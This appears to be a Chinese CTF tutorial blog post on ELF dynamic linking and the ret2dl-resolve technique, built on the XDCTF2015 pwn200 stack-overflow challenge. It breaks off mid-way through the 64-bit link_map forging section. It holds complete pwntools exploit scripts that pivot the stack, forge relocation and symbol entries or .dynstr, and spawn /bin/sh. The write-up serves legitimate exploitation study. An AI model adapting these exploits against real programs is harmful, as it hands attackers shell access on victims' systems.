---
title: ELF 文件的动态链接与 Return to dl-resolve
date: 2022-10-24
categories:
- Pwn
tags: [stack, elf]
description: Return to dl-resolve 技巧学习
---

> 参考资料：[Return-to-dl-resolve | BruceFan's Blog](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)
>
> [高级栈溢出之ret2dlresolve详解(x86&x64)，附源码分析-看雪论坛](https://bbs.pediy.com/thread-266769-1.htm#msg_header_h3_2)
>
> [附件下载](https://github.com/Up-wind/up-wind.github.io/tree/gh-pages/assets/2022-10-24-ret2dlresolve/files)



## 前置知识

### 延迟绑定，GOT 表与 PLT 表

> 参考：[深入理解GOT表和PLT表 - 知乎](https://zhuanlan.zhihu.com/p/130271689)

ELF 采用了一种叫做**延迟绑定 (Lazy Binding) **的做法来优化动态链接的性能，当库函数第一次被调用时才进行绑定（符号查找、重定位等），如果没有用到则不进行绑定。

当程序中的库函数 `write()` 被调用（call）时，会找到函数对应的 plt 表项，

第一条指令是 `jmp addr`。在函数第一次被调用之前，这个 addr 是plt表项的第二条指令，

第二条指令是 `push n`，n 这个数就是函数 `write()` 关于重定位表 .rel.plt 的偏移量，

第三条指令是 `jmp plt[0]`。plt[0] 主要是两条指令，第一条 `push got[1]`（link_map 地址）。第二条 `jmp got[2]`，调用 `dl_runtime_resolve`，解析函数位置，并回填到 got 表中，这时 plt 表项中的第一条指令 jmp 的 addr 填成了函数对应的 got 表项。

下一次调用函数时，直接在第一条指令跳转到got表项的位置，再通过got表取出函数地址。

```
call write --> write_plt --> write_got --> write_addr
```

**got 表劫持**就是在第一次调用之后，修改函数在 got 表中的地址，从而劫持程序流。

```
call write --> write_plt --> write_got --> system_addr
```

进入 `_dl_runtime_resolve()` 函数之后，程序就会进行符号查找和函数的重定位。主要是 `_dl_fixup()` 这个函数。后续分别根据32位和64位进行具体分析。



### 动态链接相关的段

.dynamic 段保存了动态链接器所需要的基本信息，比如动态链接符号表的位置、动态链接重定位表的位置等。

```bash
$ readelf -d ./pwn200 

Dynamic section at offset 0xf28 contains 20 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8048340
 0x0000000d (FINI)                       0x804861c
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x8048268
 0x00000006 (SYMTAB)                     0x80481d8
 0x0000000a (STRSZ)                      100 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x8049ff4
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048318
 0x00000011 (REL)                        0x8048300
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482e0
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482cc
 0x00000000 (NULL)                       0x0
```

.dynsym 保存动态链接这些模块之间的符号导入导出关系

.dynstr 保存动态符号字符串表

```bash
$ readelf -sD ./pwn200 

Symbol table for image contains 9 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
     6: 0804a040     4 OBJECT  GLOBAL DEFAULT   25 stdout@GLIBC_2.0 (2)
     7: 0804863c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
     8: 0804a020     4 OBJECT  GLOBAL DEFAULT   25 stdin@GLIBC_2.0 (2)
```

重定位表用于表示重定位信息：

.rel.dyn 是对数据引用的修正，修正的位置位于 .got

.rel.plt 是对函数引用的修正，修正的位置位于 .got.plt

```bash
$ readelf -r ./pwn200 

Relocation section '.rel.dyn' at offset 0x300 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
0804a020  00000805 R_386_COPY        0804a020   stdin@GLIBC_2.0
0804a040  00000605 R_386_COPY        0804a040   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x318 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a00c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```



### RELRO 编译选项

RELRO（ReLocation Read-Only）机制主要是对 GOT 表的保护。

| 编译选项     | 效果                   | .got 表 | .dynamic 表 |
| ------------ | ---------------------- | ------- | ----------- |
| `-z norelro` | No RELRO 关闭          | 可写    | 可写        |
| `-z lazy`    | Partial RELRO 部分开启 | 可写    | 只读        |
| `-z now`     | Full RELRO 完全开启    | 只读    | 只读        |

如果开启 Full RELRO，由于 GOT 只读，那么将无法进行 GOT 表劫持，写入时会因段错误而退出。

因为程序中导入的函数地址会在程序开始执行之前解析完毕，所以 GOT 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到，故 GOT 表中这两个地址均为 0，但仍可在内存中找到 link_map 和 dl-resolve 函数地址。

> [Finding link_map and _dl_runtime_resolve() under full RELRO - Peilin Ye's blog](https://ypl.coffee/dl-resolve-full-relro/)

下面介绍 No RELRO 和 Partial RELRO 情况下的 ret2dl-resolve。



## 32 位环境下 ret2dl-resolve

这里通过 XDCTF2015 的一道 pwn 题进行浅析。

源代码如下：

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}

int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

编译命令：

```bash
gcc -o bof -m32 -fno-stack-protector -z lazy -no-pie bof.c
```

> `-o` 指定输出文件名
>
> `-m32` 生成32位可执行文件
>
> `-fno-stack-protector` 关闭 canary 保护
>
> `-z lazy` RELRO 部分开启，即 Partial Relro
>
> `-no-pie` 关闭PIE保护
>
> `-fcf-protection=none` 关闭 Intel CET-IBT 机制，使函数跳转指令只出现在 .plt 段而不是一部分在 .plt.sec 段。
>
> 需要在 glibc < 2.34 下编译，否则没有 csu 通用 gadget。



### Partial RELRO 利用思路

（1）把栈迁移到 bss 段上

（2）手动调用 PLT[0]，触发 `_dl_runtime_resolve`

（3）伪造 **重定位表项偏移量** 使 reloc 定位到伪造的重定位表项（fake_reloc）

（4）伪造 **符号表项偏移索引** 使 dynsym 定位到伪造的符号表项（fake_sym）

（5）修改符号表项里的 **函数字符串偏移量** 使 dynstr 定位到伪造的函数名（fake_func）



#### Stage 1

payload1 先用 read 函数向 bss 段读入 payload2，再把栈迁移到 bss 段上。后续 payload1 都相同。

payload2 使用 write_plt 输出 `/bin/sh`

```python
#!/bin/python3
from pwn import *

elf = ELF('./pwn200')
offset = 0x6c+4
read_plt = elf.plt['read']
write_plt = elf.plt['write']

# 0x0804856c : pop esi ; pop edi ; pop ebp ; ret
ppp_ret = 0x0804856c
pop_ebp_ret = 0x08048453
leave_ret = 0x08048481

stack_size = 0x800
bss_addr = 0x804a020
base_stage = bss_addr + stack_size

p = process('./pwn200')
p.recvuntil('\n')
pause()
payload  = b'a'*offset
payload += p32(read_plt)  # read(0, base_stage, 100)
payload += p32(ppp_ret)   # 用于将栈上read参数清除
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)  # 栈迁移
payload += p32(base_stage)
payload += p32(leave_ret)

p.sendline(payload)

cmd = b"/bin/sh"
payload2  = b'AAAA'
payload2 += p32(write_plt) # write(1, cmd_addr, len(cmd))
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

pause()
p.sendline(payload2)

p.interactive()
```



#### Stage 2

Stage2 把 write_plt 中的指令分解出来。

![image-20221027173616473](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221027173616473.png)

第一条指令为跳转 write_got，此处略过。

第二条指令 0x20 是 write 函数的重定位表项在 JMPREL 重定位表中的偏移量（0x08048338-0x08048318），此处直接放入栈中，后续会对表项进行伪造。

![image-20221027174101821](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221027174101821.png)

```python
···
cmd = b"/bin/sh"
plt_0 = 0x8048370
index_offset = 0x20

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset) # 数值为 0x20
payload2 += b'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))
···
```



#### Stage 3

Stage3 把 write 函数的**重定位表项**伪造到栈上。

`index_offset = (base_stage + 0x1c) - rel_plt` 计算出在 bss 段中伪造的重定位表项（fake_reloc）关于重定位表（JMPREL）的偏移量。

重定位表 Elf32_Rel 结构如下：

```c
typedef struct {
    Elf32_Addr r_offset;      /* Address */
    Elf32_Word r_info;        /* Relocation type and symbol index */
} Elf32_Rel;
// 8字节 = 4+4
```

`r_offset` 是重定位入口，一般为对应函数 got 地址；

`r_info` 是重定位入口的类型和符号。低8位表示重定位入口类型，高24位表示重定位入口的符号在符号表的下标。

这里根据原始重定位表项伪造成 `fake_reloc = p32(r_offset) + p32(r_info) = p32(write_got) + p32(0x507)`

![image-20221029005808068](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221029005808068.png)

```python
···
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1c) - rel_plt
write_got = elf.got['write']
r_info = 0x507
fake_reloc = p32(write_got) + p32(r_info)

payload2  = b'AAAA'                           # 0x00
payload2 += p32(plt_0)                        # 0x04
payload2 += p32(index_offset)                 # 0x08
payload2 += b'AAAA'                           # 0x0c
payload2 += p32(1)                            # 0x10
payload2 += p32(base_stage + 80)              # 0x14
payload2 += p32(len(cmd))                     # 0x18
payload2 += fake_reloc                        # 0x1c
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'                     # 80
payload2 += b'A' * (100 - len(payload2))
···
```



#### Stage 4

Stage4 把 write 函数的**符号表项**伪造到栈上。

符号表 Elf32_Sym 结构如下：

```c
typedef struct
{
    Elf32_Word st_name;       /* Symbol name (string tbl index) */
    Elf32_Addr st_value;      /* Symbol value */
    Elf32_Word st_size;       /* Symbol size */
    unsigned char st_info;    /* Symbol type and binding */
    unsigned char st_other;   /* Symbol visibility */
    Elf32_Section st_shndx;   /* Section index */
} Elf32_Sym;
// 16字节 = 4+4+4+1+1+2
```

`st_name` 是符号字符串在 ELF String Table 的偏移量。`0x54 = 0x080482BC - 0x08048268`

<img src="https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221101001633913.png" alt="image-20221101001633913" style="zoom: 67%;" />

`st_value` 是该符号在内存中的地址。`st_size` 是该符号的大小。

`st_info` 包含了符号的类型和绑定属性等信息。`st_other` 保留位，为0。

`st_shndx` 是符号所在 section 的 index。

![image-20221029103240042](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221029103240042.png)

这里根据原始重定位表项伪造成 `fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)`

Elf32_Sym 结构体都是 0x10 字节大小，所以这里的 `fake_sym` 需要与 ELF Symbol Table 的表头对齐，在前面加上 align。并且计算出 `fake_sym` 距离 dynsym 表的 index。

前面已知 `r_info` 的高 24 位表示重定位入口的符号在符号表的下标，也就是 index_dynsym。低 8 位表示重定位入口类型，填上 0x07，表示 R_386_JMP_SLOT。

```python
···
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1c) - rel_plt
write_got = elf.got['write']

dynsym = 0x80481d8
dynstr = 0x8048268
fake_sym_addr = base_stage + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # &0xf取低4位
success("align --> %s " % align)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
success("index_dynsym --> %s " % index_dynsym)
r_info = (int(index_dynsym) << 8) | 0x7         # <<8左移2个字节
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x54
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2  = b'AAAA'                           # 0x00
payload2 += p32(plt_0)                        # 0x04
payload2 += p32(index_offset)                 # 0x08
payload2 += b'AAAA'                           # 0x0c
payload2 += p32(1)                            # 0x10
payload2 += p32(base_stage + 80)              # 0x14
payload2 += p32(len(cmd))                     # 0x18
payload2 += fake_reloc                        # 0x1c
payload2 += b'B' * align
payload2 += fake_sym                          # 0x24 --> 0x24+align
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'                     # 80
payload2 += b'A' * (100 - len(payload2))
···
```



#### Stage 5

把 `st_name` 指向栈上的字符串 “write”，也就是赋值为字符串关于 dynstr 的偏移量。

`st_name = (fake_sym_addr + 0x10) - dynstr`，加 0x10 为 `fake_sym` 的大小。

```python
···
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1c) - rel_plt
write_got = elf.got['write']

dynsym = 0x80481d8
dynstr = 0x8048268
fake_sym_addr = base_stage + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (int(index_dynsym) << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2  = b'AAAA'                           # 0x00
payload2 += p32(plt_0)                        # 0x04
payload2 += p32(index_offset)                 # 0x08
payload2 += b'AAAA'                           # 0x0c
payload2 += p32(1)                            # 0x10
payload2 += p32(base_stage + 80)              # 0x14
payload2 += p32(len(cmd))                     # 0x18
payload2 += fake_reloc                        # 0x1c
payload2 += b'B' * align
payload2 += fake_sym                          # 0x24+align = fake_sym_addr
payload2 += b"write\x00"                      # fake_sym_addr+0x10
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'                     # 80
payload2 += b'A' * (100 - len(payload2))
···
```



到这里就可以分析 `_dl_fixup()` 函数了，在 32 位的情况下，这个函数主要有如下步骤：

1、通过前面在 plt 表项中第二条指令 push 的 n 计算函数的重定位表项 reloc；

2、通过 reloc 的 r_info 定位符号表项 sym；

3、通过 sym 的 st_name 确定函数名并返回函数地址。

```
reloc_offset --> reloc --> r_info --> sym --> st_name --> st_value --> func()
```

```c
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
{
    // 通过 JMPREL 和 reloc_offset 算出 reloc 位置
    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);

    // 通过 reloc->r_info 找到 .dymsym 中对应的条目
    // index = ELF32_R_SYM(reloc->r_info) = (reloc->r_info) >> 8
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];

    // 检查 r_info 的最低位是否等于 7，即 R_386_JMP_SLOT
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

    // 通过 strtab + sym->st_name 找到符号表字符串，result 为 libc 基地址
    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);

    // value 为 libc 基址加上要解析函数的偏移地址，也即实际地址
    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);

    // 最后把 value 写入相应的 GOT 表项中
    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```



#### Stage 6

最后一步，把栈上的字符串改成 “system”，并修改 system 函数的参数。

```python
···
cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1c) - rel_plt
write_got = elf.got['write']

dynsym = 0x80481d8
dynstr = 0x8048268
fake_sym_addr = base_stage + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (int(index_dynsym) << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(base_stage + 80)   # system("/bin/sh")
payload2 += b'AAAA'
payload2 += b'AAAA'
payload2 += fake_reloc
payload2 += b'B' * align
payload2 += fake_sym
payload2 += b"system\x00"
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))
···
```



最终 exp：

```python
#!/bin/python3
from pwn import *

elf = ELF('./pwn200')
offset = 0x6c+4
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x0804856c
pop_ebp_ret = 0x08048453
leave_ret = 0x08048481

stack_size = 0x800
bss_addr = 0x804a020
base_stage = bss_addr + stack_size

p = process('./pwn200')
p.recvuntil('\n')
payload  = b'a'*offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)

p.sendline(payload)

cmd = b"/bin/sh"
plt_0 = 0x8048370
rel_plt = 0x8048318
index_offset = (base_stage + 0x1c) - rel_plt
write_got = elf.got['write']

dynsym = 0x80481d8
dynstr = 0x8048268
fake_sym_addr = base_stage + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (int(index_dynsym) << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2  = b'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += b'AAAA'
payload2 += p32(base_stage + 80)
payload2 += b'AAAA'
payload2 += b'AAAA'
payload2 += fake_reloc
payload2 += b'B' * align
payload2 += fake_sym
payload2 += b"system\x00"
payload2 += b'A' * (80 - len(payload2))
payload2 += cmd + b'\x00'
payload2 += b'A' * (100 - len(payload2))

p.sendline(payload2)
p.interactive()
```



### No RELRO 利用思路

```bash
gcc -m32 -o bof -fno-stack-protector -z norelro -no-pie bof.c
```

在 No RELRO 情况下，由于 .dynamic 表可写，只需将 .dynstr 段伪造到 bss 段上，再把伪造 .dynstr 的地址填到 .dynamic 表中即可。

![image-20221103014231050](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221103014231050.png)

第一次 read，把栈迁移到 bss 段上，调用第二次 read。

```python
#!/bin/python3
from pwn import *

elf = ELF('./bof')
offset = 0x6c+4
read_plt = elf.plt['read']

# 0x08049301 : pop esi ; pop edi ; pop ebp ; ret
ppp_ret = 0x08049301
pop_ebp_ret = 0x08049303
leave_ret = 0x08049115

stack_size = 0x800
bss_addr = 0x0804B2B4
base_stage = bss_addr + stack_size

p = process('./bof')
p.recvuntil('\n')

payload  = b'a'*offset
payload += p32(read_plt)       # 第二次 read(0, base_stage, 0x100)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(0x100)
payload += p32(pop_ebp_ret)    # 栈迁移
payload += p32(base_stage)
payload += p32(leave_ret)

p.sendline(payload)
···
```

第二次 read，布置好栈上伪造的 .dynstr 段和 system 参数，调用第三次read，返回时通过 write 的 plt 调用 dl-resolve。

```python
···
strtab_addr = 0x0804B1D8
write_plt_1 = 0x08049086

fake_dynstr  = b'\x00libc.so.6\x00_IO_stdin_used\x00'
fake_dynstr += b'stdin\x00strlen\x00read\x00stdout\x00'
fake_dynstr += b'setbuf\x00__libc_start_main\x00'
fake_dynstr += b'system\x00'

payload2  = b'AAAA'
payload2 += p32(read_plt)       # 第三次 read(0, strtab_addr, 8)
payload2 += p32(ppp_ret)
payload2 += p32(0)
payload2 += p32(strtab_addr)
payload2 += p32(8)
payload2 += p32(write_plt_1)    # system("/bin/sh")
payload2 += b'AAAA'
payload2 += p32(base_stage + 0x24)
payload2 += b'/bin/sh\x00'      # 0x24, binsh_addr
payload2 += fake_dynstr         # 0x2c, fake_dynstr_addr

p.sendline(payload2)
···
```

第三次 read，篡改 .dynamic 段中 .dynstr 的地址。

```python
···
fake_dynstr_addr = base_stage + 0x2c

payload3  = p32(0x5)
payload3 += p32(fake_dynstr_addr)
p.send(payload3)

p.interactive()
```



## 64 位环境下 ret2dl-resolve

> 编译环境：Ubuntu-18，GLIBC 2.27-3ubuntu1.6

### No RELRO 利用思路

还是使用上面的代码，编译为 64 位程序。

```bash
gcc -o bof -fno-stack-protector -z norelro -no-pie bof.c
```

在 No RELRO 下，64 位程序与 32 位相差不大，只在参数传递上有些许差异。

同样是先调用第二次 read，修改参数往 bss 段上伪造 .dynstr 段和 "/bin/sh" 字符串。

再调用第三次 read，篡改 .dynamic 段中 .dynstr 的地址。

```python
#!/bin/python3
from pwn import *

elf = ELF('./bof11')
offset = 0x70+8
read_plt = elf.plt['read']

stack_size = 0x100
bss_addr = 0x600B30
base_stage = bss_addr + stack_size

pop_rdi_ret = 0x400773
pop_rsi_r15_ret = 0x400771
strtab_addr = 0x600988
write_plt_1 = 0x4004E6

p = process('./bof11')
p.recvuntil('\n')

payload  = b'a'*offset
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(base_stage)
payload += p64(0)
payload += p64(read_plt)            # read(0, base_stage, 0x100)

payload += p64(pop_rsi_r15_ret)
payload += p64(strtab_addr)
payload += p64(0)
payload += p64(read_plt)            # read(0, strtab_addr, 0x100)

payload += p64(pop_rdi_ret)
payload += p64(base_stage)
payload += p64(pop_rsi_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(write_plt_1)

p.sendline(payload)

fake_dynstr  = b'\x00libc.so.6\x00stdin\x00strlen\x00read'
fake_dynstr += b'\x00stdout\x00setbuf\x00__libc_start_main\x00'
fake_dynstr += b'system\x00'

payload2  = b'/bin/sh\x00'
payload2 += fake_dynstr
p.sendline(payload2)

fake_dynstr_addr = base_stage + 0x8

payload3  = p64(0x5)
payload3 += p64(fake_dynstr_addr)
p.sendline(payload3)

p.interactive()
```



### Partial RELRO 利用思路

```bash
gcc -o bof -fno-stack-protector -z lazy -no-pie bof.c
```

#### `_dl_fixup()` 函数源码

64 位系统在执行时主要是 `_dl_fixup()` 函数与 32 位不同。

由于我们伪造的符号表在 bss 段 0x600000，而 symtab 在 0x400000，从而计算 r_info 的时候会得到一个较大的值，从而导致 `_dl_fixup()` 函数中计算出错。

```c
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)    // link_map 也就是 got[1]，reloc_arg 就是 reloc_offset
{
    // 从 link_map 中获取 DT_SYMTAB 的地址
  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    // 从 link_map 中获取 DT_STRTAB 的地址
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
    // 通过 link_map 中的 DT_JMPREL 地址和 reloc_offset 获取对应的重定位表项 reloc
  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    // 通过重定位表项中的 r_info 获取 dynsym 符号表中的表项 sym
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];

  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
    // 检测 r_info 的最低位是否等于 7，即 R_X86_64_JUMP_SLOT
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
    // 检测 sym 结构体中的 st_other 是否为 0，一般情况下是
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;
        // 检测 link_map 的 DT_VERSYM 是否为 NULL，一般情况下不是 NULL
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
        // 这里是 64 位程序报错的位置，在计算 ndx 时，由于重定位表项在 bss 段，导致 r_info 较大，故发生错误。
        // 如果能够篡改 link_map 的 DT_VERSYM 为 NULL，就不用 ret2dl-resolve 了。
        // 所以解决方法是让程序不经过上面的第一个 if，即令 st_other 不为 0。
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
      version = &l->l_versions[ndx];
      if (version->hash == 0)
        version = NULL;
    }
      ···
        // 在 32 位程序中，上面的代码运行不会出错，到这里通过 strtab+sym->st_name 找到符号表字符串
        // 返回 result 为 libc 基地址
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
      ···
      /* Currently result contains the base load address (or link map)
     of the object that defines sym.  Now add in the symbol offset.  */
        // 32位程序会运行到这里，value 为 libc 基址加上要解析函数的偏移地址，也即实际地址
      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
     address) is also known.  */
        // 64位程序利用点，这里需要控制 l->l_addr 和 sym->st_value，从而构造出 value，即函数实际地址
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }
      ···
    // 最后把 value 写入相应的 GOT 表项中
  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```

所以接下来就需要控制 link_map 中的 l_addr 和 sym 中的 st_value。

控制 l_addr 的值为 libc 中已解析的函数和目标函数的偏移值；

控制 st_value 的值为已经解析的函数的 got 表的位置。

#### 伪造 link_map

link_map 结构如下：

```c
struct link_map
  {
    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				             file and the addresses in memory.  */
    char *l_name;
    ElfW(Dyn) *l_ld;
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    struct link_map *l_real;
    Lmid_t l_ns;
    struct libname_list *l_libname;

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    ···
  }
```

我们伪造的 link_map 只需要伪造 l_addr 和 l_info 数组中 `DT_SYMTAB`、`DT_STRTAB`、`DT_JMPREL` 的地址。其他任意填写

```python
l_addr = libc.sym['system'] - libc.sym['write']
```

![image-20221105010613976](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221105010613976.png)

通过 gdb 和 ida 可以查出：

```python
DT_STRTAB_addr = link_map_addr + 0x68   # 0x0000000000600ea0
DT_SYMTAB_addr = link_map_addr + 0x70   # 0x0000000000600eb0
DT_JMPREL_addr = link_map_addr + 0xf8   # 0x0000000000600f20
```

接下来伪造这三个 Elf64_Dyn，其中，`DT_STRTAB` 指向一块可读的区域即可。

```c
typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
```

##### 伪造 DT_JMPREL

```python
    linkmap += p64(0x17)                            # 0x08 DT_JMPREL
    linkmap += p64(fake_linkmap_addr + 0x18)        # 0x10 fake_rela_addr
```

64 位程序的重定位表项 Elf64_Rela 的结构如下：

```c
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;
// 24字节 = 8+8+8
```

![image-20221105013030961](https://up-wind.github.io/assets/2022-10-24-ret2dlresolve/image-20221105013030961.png)

```python
    linkmap += p64((fake_linkmap_addr - offset) & (2**64-1))   # Rela -> r_offset
    linkmap += p64(0x7)                             # Rela -> r_info
    linkmap += p64(0)                               # Rela -> r_append
```

`Rela -> r_offset` 正常情况下存放的是 got 表项的地址，这里设置一个可读写的地址即可。

`Rela -> r_info` 设置为 7，即 `R_X86_64_JUMP_SLOT`

`Rela -> r_append` 填为 0

##### 伪造 DT_SYMTAB

64 位程序的符号表 Elf64_Sym 结构如下：

```c
typedef struct
{
    Elf64_Word      st_name;      /* Symbol name (string tbl index) */
    unsigned char   st_info;      /* Symbol type and binding */
    unsigned char   st_other;     /* Symbol visibility */
    Elf64_Section   st_shndx;     /* Section index */
    Elf64_Addr      st_value;     /* Symbol value */
